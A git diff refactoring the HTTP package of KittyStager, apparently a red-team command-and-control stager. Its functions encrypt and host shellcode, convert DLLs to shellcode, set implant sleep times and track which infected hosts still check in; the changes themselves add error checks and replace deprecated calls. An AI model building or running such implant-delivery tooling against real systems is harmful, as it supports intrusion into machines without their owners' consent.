@@ -1,4 +1,4 @@
-package httpUtil
+package http
 
 import (
 	"KittyStager/cmd/crypto"
@@ -7,8 +7,8 @@ import (
 	"encoding/json"
 	"fmt"
 	color "github.com/logrusorgru/aurora"
-	"io/ioutil"
 	"net/http"
+	"os"
 	"time"
 )
 
@@ -16,14 +16,18 @@ var Targets map[string]*Kitten
 
 // HostShellcode Hosts the shellcode
 func HostShellcode(path string, kittenName string) error {
-	var task util.Task
+	task := util.NewTask()
 	var err error
 	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
-	sc, err := ioutil.ReadFile(path)
+	sc, err := os.ReadFile(path)
+	if err != nil {
+		return err
+	}
 	contentType := http.DetectContentType(sc)
 	//checks if the file is a hex file
 	if contentType == "text/plain; charset=utf-8" {
-		task = util.Task{Tag: "shellcode", Payload: sc}
+		task.SetTag("shellcode")
+		task.SetPayload(sc)
 		// check if the file is a binary
 	} else if contentType == "application/octet-stream" {
 		hexstring := fmt.Sprintf("%x ", sc)
@@ -31,8 +35,13 @@ func HostShellcode(path string, kittenName string) error {
 		task.SetPayload([]byte(hexstring))
 	}
 	payload, err := json.Marshal(task)
+	if err != nil {
+		return err
+	}
 	shellcode, err := crypto.Encrypt(payload, key)
-
+	if err != nil {
+		return err
+	}
 	if err != nil {
 		return err
 	}
@@ -45,7 +54,7 @@ func HostShellcode(path string, kittenName string) error {
 // HostSleep Hosts the sleep time the same way as the shellcode
 func HostSleep(t int, kittenName string) error {
 	Targets[kittenName].SetSleep(t)
-	var task util.Task
+	task := util.NewTask()
 	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
 	task.SetTag("sleep")
 	task.SetPayload([]byte(fmt.Sprintf("%d", t)))
@@ -63,18 +72,24 @@ func HostSleep(t int, kittenName string) error {
 }
 
 func HostDll(path, entry, kittenName string) error {
-	var task util.Task
+	task := util.NewTask()
 	var err error
 	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
-	dll, err := ioutil.ReadFile(path)
+	dll, err := os.ReadFile(path)
 	if err != nil {
 		return err
 	}
 	sc, err := srdi.DllToShellcode(dll, entry)
+	if err != nil {
+		return err
+	}
 	hexstring := fmt.Sprintf("%x ", sc)
 	task.SetTag("shellcode")
 	task.SetPayload([]byte(hexstring))
 	payload, err := json.Marshal(task)
+	if err != nil {
+		return err
+	}
 	shellcode, err := crypto.Encrypt(payload, key)
 
 	if err != nil {
@@ -92,7 +107,8 @@ func CheckAlive() {
 		time.Sleep(1 * time.Second)
 		for name, x := range Targets {
 			if Targets[name].Alive {
-				t := time.Now().Sub(x.GetLastSeen())
+				//t := time.Now().Sub(x.GetLastSeen())
+				t := time.Since(x.GetLastSeen())
 				sleepTime := time.Duration(x.GetSleep()) * time.Second
 				if t > sleepTime+5*time.Second {
 					Targets[name].SetAlive(false)
